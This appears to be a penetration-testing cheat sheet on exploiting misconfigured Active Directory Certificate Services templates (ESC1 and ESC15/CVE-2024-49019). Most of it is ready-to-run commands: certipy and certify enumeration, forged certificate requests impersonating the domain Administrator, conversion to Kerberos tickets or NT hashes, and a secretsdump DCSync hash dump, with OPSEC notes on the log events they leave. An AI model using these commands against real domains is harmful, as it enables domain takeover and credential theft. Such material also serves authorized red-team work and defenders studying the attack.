# Active Directory Certificate Services (AD CS)
**Concept:** AD CS allows users and computers to request digital certificates (for Wi-Fi, VPN, Smart Card login). 
**The Flaw:** If a certificate template is configured to allow users to "supply their own subject" (SAN), an attacker can request a certificate claiming to be the Domain Admin. This certificate can then be used to request a Kerberos TGT (Ticket Granting Ticket).
## 1. Enumeration (Finding Vulnerabilities)
**Goal:** Identify misconfigured templates (ESC1 - ESC8). 
**Tool:** `Certipy` (Linux) or `Certify` (Windows).
### From Linux (Certipy)
Certipy is a Python tool that acts as a "BloodHound for Certificates." It scans AD CS and highlights vulnerable paths.
```shell
# Install
pip3 install certipy-ad

# Scan (Vulnerable Only)
# -vulnerable: Only show exploit paths
# -stdout: Print to screen (also saves .json/zip for BloodHound)
certipy-ad find -vulnerable -stdout -u 'user@domain.local' -p 'password' -dc-ip <DC_IP>
```
### From Windows (Certify)
Certify is a C# tool for Cobalt Strike or C2 usage.
```shell
# Scan for vulnerable templates
.\Certify.exe find /vulnerable
```
## 2. Exploitation: ESC1 (Misconfigured Template)
**Vulnerability:** The template allows:
1. **Client Authentication** (can be used to log in).
2. **Enrollee Supplies Subject** (we can say "I am Admin").
3. **Low-priv users can enroll.**

**Attack Path:**
1. Request a certificate for the template (e.g., `UserVulnerable`).
2. Specify the target User Principal Name (UPN) as `Administrator`.
3. Use the certificate to get a TGT.
### Step 1: Request the Certificate (Certipy)
```shell
# Syntax: certipy req -u <User> -p <Pass> -ca <CA_Name> -target <CA_IP> -template <TemplateName> -upn <TargetUser>
certipy req -u 'user@domain.local' -p 'password' -ca 'CORP-DC-CA' -target 172.16.5.5 -template 'UserAuthentication' -upn 'Administrator@domain.local' -dns 'dc01.domain.local'

# Output: saved as 'administrator.pfx'
```
### Step 2: Authenticate (Get TGT)
Convert the `.pfx` (Certificate) into a Kerberos TGT (`.ccache`).
```shell
# Syntax: certipy auth -pfx <File.pfx> -dc-ip <DC_IP>
certipy auth -pfx administrator.pfx -dc-ip 172.16.5.5
```
### Step 3: Use the Ticket
Export the ticket and perform a DCSync.
```shell
export KRB5CCNAME=administrator.ccache

# Dump hashes
secretsdump.py -k -no-pass 'domain.local/Administrator@dc01.domain.local'
```
## 3. Exploitation: ESC15 (CVE-2024-49019)
**Concept:** CVE-2024-49019 is a privilege escalation vulnerability in Active Directory Certificate Services (ADCS). Similar to the classic **ESC1** misconfiguration, it occurs when a certificate template allows the requester to specify a Subject Alternative Name (SAN). However, this specific CVE bypasses previous mitigations by exploiting how specific templates handle User Principal Names (UPN) to impersonate high-privileged users.
### 1. Requirements for Exploitation
The template must meet the following criteria (identifiable via `certipy find`):
- **msPKI-Certificate-Name-Flag:** Must contain `ENROLLEE_SUPPLIES_SUBJECT` (allowing SAN specification).
- **Extended Key Usage (EKU):** Must include `Client Authentication`, `Smartcard Logon`, or `Any Purpose`.
- **Enrollment Rights:** Your current low-privileged user must have permissions to request the template.
### 2. Requesting the Malicious Certificate
**Goal:** Request a certificate for a target Administrator using the vulnerable template and specify the target's UPN.
**Description:** Request a certificate from the CA using a vulnerable template while spoofing a target UPN. 
**Syntax:** 
```shell
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <CA_IP/CA_DNS_NAME> -ca <CA_NAME> -template <TEMPLATE_NAME> -upn '<TARGET_UPN>'

# Example:
certipy-ad req -u 'jdoe' -p 'P@ssw0rd123' -target 10.10.10.50 -ca 'CORP-CA' -template 'UserVulnerable' -upn 'administrator@corp.local'
```
- TARGET = `Certificate Authorities` > `DNS Name`
- CA_NAME = `Certificate Authorities` > `CA Name`
- TEMPLATE_NAME = `Certificate Templates` > `Template Name`
**OPSEC Warning:** This generates a **Certificate Request** event (ID 4886) and a **Certificate Issued** event (ID 4887) on the CA logs. The target UPN will be visible in the certificate details.
### 3. Verification & Validation
Before attempting authentication, verify that the issued certificate contains the required Extended Key Usage (EKU) for Kerberos.

**Description:** Check the EKU of the issued certificate to ensure it supports Client Authentication. 
**Syntax:** 
```shell
openssl x509 -in <CERT_FILE>.pem -text -noout | grep -i "Extended Key Usage" -A 2
```
**Required Output:** Look for `TLS Web Client Authentication`, `Microsoft Smartcard Logon`, or `Client Authentication`. If these are missing, the certificate cannot be used for Kerberos authentication.
### 4. Authentication (Privilege Escalation)
**Goal:** Exchange the `.pfx` certificate for the target user's NT hash or a Kerberos Ticket (TGT).

**Description:** Authenticate to the Domain Controller using the certificate to retrieve the NT hash.
**Syntax:**
```shell
certipy-ad auth -pfx <USERNAME>.pfx -dc-ip <DC_IP>

# Example:
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10
```
**OPSEC Warning:** This triggers a **Kerberos Authentication Service** event (ID 4768) with a Pre-Authentication Type of **16** (PKINIT).